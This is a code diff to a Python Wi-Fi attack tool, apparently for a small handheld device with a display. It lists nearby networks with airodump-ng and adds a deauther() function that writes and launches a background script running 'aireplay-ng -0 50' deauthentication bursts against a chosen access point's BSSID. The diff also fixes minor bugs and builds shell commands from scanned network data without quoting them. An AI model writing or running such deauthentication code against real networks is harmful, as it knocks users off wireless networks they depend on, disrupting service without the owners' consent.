@@ -304,7 +304,7 @@ def sysinfos():
             return()
         Disk = res.split("'")[1]
         print(str(IP3))
-        if(str(IP3)== '\n\''):
+        if(str(IP3)== str('\n\`')):
             IP = "refresh the Connection"   
         DisplayText(
             "WIFI: " + IP.split("'")[1],
@@ -1430,18 +1430,19 @@ def getSSID():
         DisplayText("","","wait","","","","")
         time.sleep(10)
         errore = 0
-        while(errore = 0):
+        while(errore == 0):
             cmd = "ps -aux | grep 'airodump-ng wlan0mon -w reportAiro -a' | head -n 1 | cut -d ' ' -f7"
             res = execcmd(cmd)
             if(res==-1):
                 displayError()
                 time.sleep(5)
                 return()
-            cmd = "kill " + (str(res).split("'")[1])[:-1]
+            cmd = "kill " + (str(res).split("'")[1])[:-2]
+            #print(cmd)
             res = execcmd(cmd)
             if(res==-1):
-                print("errore nella kill")
-                displayError()
+                #print("errore nella kill")
+                #displayError()
                 time.sleep(5)
                 errore=1
 
@@ -1454,7 +1455,7 @@ def getSSID():
     if(res==-1):
         displayError()
         return()
-    cmd="rm -rf reportAiro* && rm nohup.out && touchedcommand.sh"
+    cmd="rm -rf reportAiro* && rm nohup.out && rm touchedcommand.sh"
     toDEl = execcmd(cmd)
     if(toDEl==-1):
         displayError()
@@ -1470,8 +1471,8 @@ def getSSID():
         res[i]=res[i][-1]+ ","+res[i][3] +","+ res[i][0]
         
     ssidlist=res
-    print("eccomi")
-    print(ssidlist)
+    #print("eccomi")
+    #print(ssidlist)
 
     #----------------------------------------------------------
     listattack=ssidlist
@@ -1545,14 +1546,37 @@ def deauther():
         displayError()
         return()
     print(target[2])
-    
-    cmd=" airodump-ng -c " + str(target[1] )+" --bssid " + str(target[2]) + " wlan0mon  && aireplay-ng -0 10 -a " + str(target[2]) + " wlan0mon"
-    print(cmd)
+
+    #cmd = "airodump-ng -c " + str(target[1] )+" --bssid " + str(target[2]) + " wlan0mon && echo 'finito' "
+    ##cmd2 =  "aireplay-ng -0 10 -a " + str(target[2]) + " wlan0mon"
+    tx1="timeout 2s airodump-ng -c " + str(target[1] )+" --bssid " + str(target[2]) + " wlan0mon"
+    tx2= "aireplay-ng -0 50 -a " + str(target[2]) + " wlan0mon"
+    cmd ="touch touchedcommand.sh && echo '#!/bin/bash\n"+ tx1 +" &' > touchedcommand.sh && chmod +x touchedcommand.sh"
     res = execcmd(cmd)
     if(res==-1):
         displayError()
         return()
+    Popen(['nohup','/bin/bash','touchedcommand.sh'],preexec_fn=os.setpgrp)
+    DisplayText("","","set the channel","","","","")
+    time.sleep(4)
+    #print(cmd)
+    #subprocess.call(["timeout 2s",str(cmd)])
+    ##Popen(['timeout',cmd],preexec_fn=os.setpgrp)
+    cmd ="echo '#!/bin/bash\n"+ tx2 +" &' > touchedcommand.sh && chmod +x touchedcommand.sh"
+    res = execcmd(cmd)
+    if(res==-1):
+        displayError()
+        return()
+    Popen(['nohup','/bin/bash','touchedcommand.sh'],preexec_fn=os.setpgrp)
+    DisplayText("","","doing the stuff","","","","")
+    time.sleep(10)
+    cmd="rm touchedcommand.sh"
+    toDEl = execcmd(cmd)
+    if(toDEl==-1):
+        displayError()
+        return()
     return()
+
     
         
     
